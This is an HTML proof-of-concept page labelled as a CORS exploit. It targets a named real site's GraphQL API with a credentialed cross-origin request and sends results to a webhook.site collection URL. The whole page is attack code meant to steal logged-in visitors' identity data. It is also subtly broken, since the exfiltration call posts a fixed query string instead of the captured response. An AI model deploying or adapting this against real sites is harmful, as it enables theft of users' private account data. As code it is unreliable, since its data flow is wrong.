<!DOCTYPE html>
<html>
  <body>
    <h2>ðŸ’¥ CORS Exploit Running...</h2>

    <script>
      // Replace this with your webhook listener (e.g., requestbin, webhook.site)
      const webhook = "https://webhook.site/57d05575-394e-4d7f-b280-b805ce1da79e";

      // The target vulnerable API endpoint
      const target = "https://www.nerdwallet.com/api/supergraph";

      // Attempt to fetch protected data with credentials
      fetch(target, {
        method: "POST",
        credentials: "include"
      })
      .then(res => res.text())
      .then(data => {
        // Leak the response to your webhook
        fetch(webhook, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({"operationName":"GetIdentityDataForWebPush","variables":{},"query":"query GetIdentityDataForWebPush {\n  rawIdentity {\n    data\n    __typename\n  }\n}\n"})
        });
      })
      .catch(err => {
        // Optional: report fetch failure
        fetch(webhook, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ error: err.toString() })
        });
      });
    </script>
  </body>
</html>
